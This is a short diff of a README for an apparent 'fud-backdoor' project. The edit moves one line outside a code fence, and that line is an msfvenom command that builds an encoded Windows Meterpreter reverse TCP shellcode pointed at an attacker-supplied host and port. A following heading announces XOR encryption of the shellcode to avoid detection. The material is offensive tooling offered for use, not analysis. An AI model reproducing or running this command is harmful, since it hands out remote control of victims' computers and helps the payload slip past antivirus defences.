@@ -10,8 +10,8 @@ cd fud-backdoor
 ## Generate The ShellCode
 
 ```
-msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=(IP) LPORT=(PORT) -f raw -o raw.txt
 ```
+msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=(IP) LPORT=(PORT) -f raw -o raw.txt
 
 ## Encode the ShellCode With the XOR Encryption
 
